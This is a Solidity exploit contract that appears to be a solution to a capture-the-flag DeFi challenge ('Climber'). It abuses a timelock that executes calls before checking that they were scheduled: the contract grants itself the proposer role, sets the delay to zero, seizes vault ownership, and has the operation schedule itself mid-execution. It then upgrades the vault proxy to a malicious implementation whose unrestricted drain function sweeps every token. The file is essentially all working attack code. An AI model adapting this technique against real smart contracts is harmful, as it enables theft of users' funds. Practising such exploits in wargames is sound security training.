// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Initializable} from "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "solmate/utils/SafeTransferLib.sol";

import {ClimberTimelock} from "../src/ClimberTimelock.sol";
import {ClimberVault} from "../src/ClimberVault.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract Attack {
    ClimberVault vault; // This should be the proxy
    ClimberTimelock timelock;
    address token;
    address recovery;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;
    bytes32 salt;

    constructor(
        ClimberVault _vault,
        ClimberTimelock _timelock,
        address _token,
        address _recovery
    ) {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        recovery = _recovery;
        salt = bytes32(0);
    }

    function attack() external {
        // Deploy malicious implementation
        address maliciousImpl = address(new MaliciousVault());

        // Prepare the operation data
        targets = new address[](4);
        values = new uint256[](4);
        dataElements = new bytes[](4);

        // 1. Grant PROPOSER_ROLE to this contract
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            keccak256("PROPOSER_ROLE"),
            address(this)
        );

        // 2. Update delay to 0
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSignature(
            "updateDelay(uint64)",
            uint64(0)
        );

        // 3. Make timelock transfer ownership of vault to this contract
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );

        // 4. Schedule this operation (called during execution)
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSignature("scheduleOperation()");

        // Execute the operation (this will schedule itself during execution)
        timelock.execute(targets, values, dataElements, salt);

        // Now we own the vault and can upgrade it
        vault.upgradeToAndCall(maliciousImpl, "");

        // Drain the funds
        MaliciousVault(address(vault)).drainFunds(token, recovery);
    }

    function scheduleOperation() external {
        // This is called during the execute() function to schedule the operation
        // By the time this is called, we already have PROPOSER_ROLE and delay is 0
        timelock.schedule(targets, values, dataElements, salt);
    }
}

contract MaliciousVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    function drainFunds(address tokenAddress, address receiver) external {
        ERC20 token = ERC20(tokenAddress);
        uint256 balance = token.balanceOf(address(this));

        // SafeTransferLib.safeTransfer expects ERC20 type from solmate
        SafeTransferLib.safeTransfer(token, receiver, balance);
    }

    function _authorizeUpgrade(
        address newImplementation
    ) internal override onlyOwner {}
}
